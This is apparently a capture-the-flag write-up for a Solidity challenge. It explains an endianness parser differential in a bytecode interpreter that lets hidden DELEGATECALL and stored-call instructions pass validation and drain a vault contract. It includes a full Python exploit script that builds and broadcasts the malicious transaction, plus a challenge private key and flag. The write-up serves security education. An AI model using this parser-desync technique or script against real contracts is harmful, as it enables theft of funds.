# Writeup: Blockchain Control Plane

**Category:** Blockchain / Smart Contract Exploitation  
**Challenge Name:** Blockchain Control Plane  
**Flag:** `zdk{enDiaN_FIreWaL1_D3LeGA7e_DR4in}`  

---

## 1. Challenge Overview

The challenge provides a set of Solidity contracts along with an unverified bytecode contract (`Kernel`):
- `Setup.sol`: Deploys `Vault`, `TelemetryModule`, and binds `Kernel`. Win condition: `vault.drainedBy() == player`.
- `Vault.sol`: Holds 100 ETH. Has a restricted `settle(address payable recipient, uint256 amount, bytes16 ticket)` function callable only by its registered `gateway` (`Kernel`).
- `TelemetryModule.sol`: A module approved in `Kernel.modules`. Exposes `rotate(uint256 next)` which writes `next` to storage slot 2 (`retained`).
- `Kernel.sol` (`IKernel.sol`): The gateway contract that exposes `execute(bytes program)`.

Our goal is to execute arbitrary/privileged calls through `Kernel` to invoke `Vault.settle(player, 100 ether, ticket)` and drain all funds to the player address.

---

## 2. Reverse Engineering the Kernel Bytecode

Disassembling the `Kernel` bytecode revealed a two-pass TLV (Type-Length-Value) interpreter for the binary `program` passed into `execute(bytes)`:

```
+--------------------------------------------------------------------------------+
| Tag (1 byte) | Length (2 bytes) | Payload (Variable)                           |
+--------------------------------------------------------------------------------+
```

### Top-Level Tags
1. **Tag `0x08` (Authentication Key)**:
   - Length: 32 bytes (`0x20`).
   - Expected value:
     $$\text{Key} = \text{keccak256}(\text{Kernel} \parallel \text{Vault} \parallel \text{ChainId}) \oplus \text{0x7b8c1e3a95d26f1042a967dca80bf1e771ab93c5dd2a06844f0c3162b16e9d57}$$

2. **Tag `0x31` (Execution Section)**:
   - Contains inner TLVs defining the execution sequence.
   - Evaluated in two passes:
     - **Pass 1 (Validator)**: Checks all instructions for security rules.
     - **Pass 2 (Executor)**: Executes the instruction stream.

### Instruction Formats inside Tag `0x31`
- **Tag `0x12`**: Comment / NOP tag (skipped).
- **Tag `0xee`**: Section terminator (length 0).
- **Tag `0x2d`**: Executable Instruction:
  - Byte 0: Tag (`0x2d`)
  - Byte 1..2: Length
  - Byte 3: Mode (`0x00 = CALL`, `0x01 = DELEGATECALL`, `0x02 = STORED_CALL`)
  - Byte 4..23: Target address (20 bytes)
  - Byte 24..: Calldata payload

---

## 3. Vulnerability Analysis: Parser Differential (Endianness Mismatch)

When reversing the binary deserialization logic across both passes:

1. **Pass 1 (Validator - `0x3f1` / `0x4af`)**:
   - Parsed 16-bit TLV lengths in **Little-Endian (LE)**:
     $$\text{Length}_{\text{LE}} = (\text{Byte}_2 \ll 8) \mid \text{Byte}_1$$
   - Enforced strict restrictions on Tag `0x2d`:
     - Disallowed Mode 1 (`DELEGATECALL`) and Mode 2 (`STORED_CALL`).
     - Allowed only Mode 0 calls to approved modules.

2. **Pass 2 (Executor - `0x1f0`)**:
   - Parsed 16-bit TLV lengths in **Big-Endian (BE)**:
     $$\text{Length}_{\text{BE}} = (\text{Byte}_1 \ll 8) \mid \text{Byte}_2$$

### The Desync Primitive
By crafting a TLV with Tag `0x12` (NOP) and length bytes `[0x00, 0x01]`:
- **In Pass 1 (LE)**: Length is $(0x01 \ll 8) \mid 0x00 = 256$ bytes. The validator treats the next 256 bytes as a comment and skips straight to the terminator `Tag 0xee`, passing validation instantly.
- **In Pass 2 (BE)**: Length is $(0x00 \ll 8) \mid 0x01 = 1$ byte. The executor skips only 1 dummy byte and immediately begins executing whatever is hidden inside the padded 256 bytes!

```
Calldata stream inside Tag 0x31:
[ 0x12 ] [ 0x00 ] [ 0x01 ] [ dummy_byte ] [ Tag 0x2d (Mode 1) ] [ Tag 0x2d (Mode 2) ] [ Tag 0xee ] ... [ Tag 0xee ]
   |                                              |
   +--- Validator (LE): skips 256 bytes --------->+ (hits outer Tag 0xee, VALIDATES!)
   |
   +--- Executor (BE): skips 1 byte -> executes hidden instructions!
```

---

## 4. Execution Mechanics & Constraint Solving

Inside the hidden payload, we chain two instructions:

### Step 1: Mode 1 (`DELEGATECALL`) on `TelemetryModule`
- Mode 1 performs a `DELEGATECALL` to an approved module (`modules[telemetry] == 1`).
- We call `TelemetryModule.rotate(uint256(auth_key))`.
- This sets `Kernel`'s Storage Slot 2 (`retained`) to `auth_key`.

### Step 2: Mode 2 (`STORED_CALL`) on `Vault`
- Mode 2 checks:
  1. `target == Vault` (SLOAD 0)
  2. `Kernel.storage[2] == auth_key` (SLOAD 2 verified against expected key)
- Once verified, it executes a direct `CALL` to `Vault` with:
  `settle(player, vault_balance, ticket)`

### Computing the Vault Ticket
From `Vault.sol`:
```solidity
seal = keccak256(abi.encodePacked(vaultAddress, block.chainid, bytes9("settle-v2")));
ticket = bytes16(keccak256(abi.encodePacked(seal, playerAddress, amount)));
```

---

## 5. Exploit Script

```python
import requests
import time
from eth_utils import keccak, to_checksum_address
from eth_abi import encode
from eth_account import Account

RPC_URL = 'https://control-plane-aec5b28e7df6.chals.z0d1ak.org/rpc'
CHAL_URL = 'https://control-plane-aec5b28e7df6.chals.z0d1ak.org'
PRIV_KEY = '0x6e06a4304b6d9162a697070da795c259ff06baaf579f4ae2b6faf5193ac09d1b'

info = requests.get(f'{CHAL_URL}/info').json()
player_addr = info['playerAddress']
setup_addr = info['setupAddress']
chainid = info['chainId']

# Resolve contract addresses
sel_vault = keccak(b'vault()')[:4].hex()
vault_resp = requests.post(RPC_URL, json={'jsonrpc': '2.0', 'id': 1, 'method': 'eth_call', 'params': [{'to': to_checksum_address(setup_addr), 'data': '0x' + sel_vault}, 'latest']}).json()
vault_addr = '0x' + vault_resp['result'][-40:]

sel_telemetry = keccak(b'telemetry()')[:4].hex()
telem_resp = requests.post(RPC_URL, json={'jsonrpc': '2.0', 'id': 1, 'method': 'eth_call', 'params': [{'to': to_checksum_address(setup_addr), 'data': '0x' + sel_telemetry}, 'latest']}).json()
telemetry_addr = '0x' + telem_resp['result'][-40:]

sel_kernel = keccak(b'kernel()')[:4].hex()
kernel_resp = requests.post(RPC_URL, json={'jsonrpc': '2.0', 'id': 1, 'method': 'eth_call', 'params': [{'to': to_checksum_address(setup_addr), 'data': '0x' + sel_kernel}, 'latest']}).json()
kernel_addr = '0x' + kernel_resp['result'][-40:]

kernel_bytes = bytes.fromhex(kernel_addr[2:])
telemetry_bytes = bytes.fromhex(telemetry_addr[2:])
vault_bytes = bytes.fromhex(vault_addr[2:])
player_bytes = bytes.fromhex(player_addr[2:])
chainid_bytes = chainid.to_bytes(32, 'big')

# 1. Auth Key for Tag 0x08
buf = kernel_bytes + vault_bytes + chainid_bytes
h = keccak(buf)
magic = bytes.fromhex('7b8c1e3a95d26f1042a967dca80bf1e771ab93c5dd2a06844f0c3162b16e9d57')
expected_key = bytes([a ^ b for a, b in zip(h, magic)])
t08 = bytes([0x08, 0x20, 0x00]) + expected_key

# 2. Step A: Tag 0x2d (Mode 1 DELEGATECALL -> rotate(auth_key))
rotate_sel = bytes.fromhex('3852f4b0') # rotate(uint256)
rotate_data = rotate_sel + expected_key
val_stepA = bytes([0x01]) + telemetry_bytes + rotate_data
lenA = len(val_stepA) # 57 bytes
t_stepA = bytes([0x2d, (lenA >> 8) & 0xff, lenA & 0xff]) + val_stepA

# 3. Step B: Tag 0x2d (Mode 2 CALL -> vault.settle(player, bal, ticket))
settle_str = b'settle-v2'
seal = keccak(vault_bytes + chainid_bytes + settle_str)
bal_resp = requests.post(RPC_URL, json={'jsonrpc': '2.0', 'id': 1, 'method': 'eth_getBalance', 'params': [to_checksum_address(vault_addr), 'latest']}).json()
vault_bal = int(bal_resp['result'], 16)

amount_bytes = vault_bal.to_bytes(32, 'big')
quote_full = keccak(seal + player_bytes + amount_bytes)
ticket = quote_full[:16]

settle_sel = bytes.fromhex('3c5e9fec') # settle(address,uint256,bytes16)
call_data = settle_sel + b'\x00'*12 + player_bytes + amount_bytes + ticket + b'\x00'*16
val_stepB = bytes([0x02]) + vault_bytes + call_data
lenB = len(val_stepB) # 121 bytes
t_stepB = bytes([0x2d, (lenB >> 8) & 0xff, lenB & 0xff]) + val_stepB

# 4. Desync Wrapping inside Tag 0x12
tee_loop2 = bytes([0xee, 0x00, 0x00])
loop2_payload = t_stepA + t_stepB + tee_loop2
hidden_content = b'\x00' + loop2_payload
hidden_content_padded = hidden_content + b'\x00' * (256 - len(hidden_content))

t12 = bytes([0x12, 0x00, 0x01]) + hidden_content_padded
tee_loop1 = bytes([0xee, 0x00, 0x00])

val_31 = t12 + tee_loop1
len31 = len(val_31)
t31 = bytes([0x31, len31 & 0xff, (len31 >> 8) & 0xff]) + val_31

prog = t08 + t31
calldata = bytes.fromhex('09c5eabe') + encode(['bytes'], [prog])

# 5. Broadcast Exploit Transaction
acct = Account.from_key(PRIV_KEY)
resp = requests.post(RPC_URL, json={'jsonrpc': '2.0', 'id': 1, 'method': 'eth_getTransactionCount', 'params': [to_checksum_address(player_addr), 'latest']})
nonce = int(resp.json()['result'], 16)

tx = {
    'nonce': nonce,
    'gasPrice': 1000000000,
    'gas': 3000000,
    'to': to_checksum_address(kernel_addr),
    'value': 0,
    'data': '0x' + calldata.hex(),
    'chainId': chainid
}

signed_tx = acct.sign_transaction(tx)
resp = requests.post(RPC_URL, json={'jsonrpc': '2.0', 'id': 1, 'method': 'eth_sendRawTransaction', 'params': ['0x' + signed_tx.raw_transaction.hex()]})
tx_hash = resp.json()['result']

time.sleep(1)
flag = requests.get(f'{CHAL_URL}/flag').json()
print("Flag:", flag['flag'])
```

---

## 6. Flag

```
zdk{enDiaN_FIreWaL1_D3LeGA7e_DR4in}
```
